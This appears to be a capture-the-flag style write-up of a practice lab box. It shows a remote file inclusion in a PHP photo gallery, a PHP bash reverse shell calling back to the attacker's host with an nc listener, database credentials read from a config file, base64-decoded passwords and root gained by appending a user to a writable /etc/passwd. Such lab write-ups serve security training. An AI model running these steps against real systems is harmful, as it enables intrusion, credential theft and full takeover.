---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Starting with a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.126.58
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-12 15:41 EST
Nmap scan report for 192.168.126.58
Host is up (0.026s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open  mysql       MySQL (unauthorized)
Service Info: Host: SNOOKUMS; OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.83 seconds
```

## port 21 (`ftp`)
> Anonymous access is allowed.
{: .prompt-info }

> Unfortunately nothing is available on the `ftp` service.
{: .prompt-danger }

## port 22 (`ssh`)
> No weak credentials can be identified.
{: .prompt-danger }

## port 139,445 (`smb`)
> No shares available.
{: .prompt-danger }

## port 3306 (`mysql`)
> It is not allowed to connect to the `mysql` service from a from remote IP.
{: .prompt-danger }

## port 80 (web server)
`Simple PHP Photo Gallery v0.8` is installed on the web server.

---

# exploitation
## find exploit

> Googling for exploits for `Simple PHP Photo Gallery v0.8` reveals that the application is vulnerable to a [remote file inclusion](https://www.exploit-db.com/exploits/48424) (`site.com/image.php?img=[ PAYLOAD ]`).
{: .prompt-info }

## exploit it
### script to include
Simple reverse shell `php` code.
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/192.168.49.126/21 0>&1'");
?>
```

### provide shell via web server
```bash
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

### trigger back connect
```bash
$ curl 'http://192.168.126.58/image.php?img=http://192.168.126.58/shell.php'
```

### catch connect from target
```bash
$ nc -lvp 21
listening on [any] 21 ...
192.168.126.58: inverse host lookup failed: Unknown host
connect to [192.168.49.126] from (UNKNOWN) [192.168.126.58] 41630
bash: no job control in this shell
bash-4.2$ whoami
whoami
apache
```

> Shell!
{: .prompt-info }

---

# post exploitation
## privilege escalation
There is a user named `michael` available.
```bash
bash-4.2$ cd /home
cd /home
bash-4.2$ ls
ls
michael
```

Look for the credentials of the `mysql` service.
```bash
bash-4.2$ cd /var/www/html
cd /var/www/html
bash-4.2$ ls
ls
README.txt
UpgradeInstructions.txt
css
db.php
embeddedGallery.php
functions.php
image.php
images
index.php
js
license.txt
photos
phpGalleryConfig.php
phpGalleryStyle-RED.css
phpGalleryStyle.css
phpGallery_images
phpGallery_thumbs
thumbnail_generator.php
bash-4.2$ cat db.php
cat db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>
```
> We discovered the `mysql` `root` credentials `root:MalapropDoffUtilize1337`.
{: .prompt-info }

Lets connect to the `mysql` service.
```bash
bash-4.2$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.20 MySQL Community Server - GPL

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
mysql>
```

Looking for credentials stored in database tables.
```bash
mysql>show databases;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)
```

We see that there is a password stored for a user named `michael`. Lets decode the password as it seems to be `base64` encoded.

```bash
$ echo 'U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==' | base64 -d
SG9ja1N5ZG5leUNlcnRpZnkxMjM=
```

It seems that the string is still `base64` encoded. Lets decode it again.

```bash
$ echo 'SG9ja1N5ZG5leUNlcnRpZnkxMjM=' | base64 -d
HockSydneyCertify123
```

> We now have a password for user `michael` (`HockSydneyCertify123`) which might also works to access his `ssh` account.
{: .prompt-info }

Now we are logging in via `ssh` using `michael:HockSydneyCertify123`
```bash
$ ssh michael@192.168.126.58
michael@192.168.126.58's password: 
[michael@snookums ~]$ id
uid=1000(michael) gid=1000(michael) groups=1000(michael) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

> It worked!
{: .prompt-info }

We are user `michael`, but the goal is to gain `root` access to the system.  
So, we now check some basic escalation techniques to check if we can elevate our privileges to `root`.

> The file `/etc/passwd` is writeable.
{: .prompt-info }

We are now creating a `hash` for a new user we want add to the system.
```bash
$ openssl passwd -1 -salt new 123
$1$new$p7ptkEKU1HnaHpRtzNizS1
```
Appending the following line to the file `/etc/passwd` will create a `root` user with the name `new`.  
  
`new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`  
  
Now we can switch to our newly created `root` user (`new:123`).
```bash
[michael@snookums tmp]$ su new
Password: 
[root@snookums tmp]# whoami
root
```

> Root access!
{: .prompt-info }

## get the flags
### get first flag
```bash
bash-4.2$ cd /home
cd /home
bash-4.2$ ls
ls
michael
bash-4.2$ cd michael
cd michael
[michael@snookums ~]$ ls
local.txt
[michael@snookums ~]$ cat local.txt
1******************************c
```

### get second flag
```bash
[root@snookums tmp]# cd /root/
[root@snookums ~]# cat proof.txt 
8******************************6
```

Pwned! <@:-)
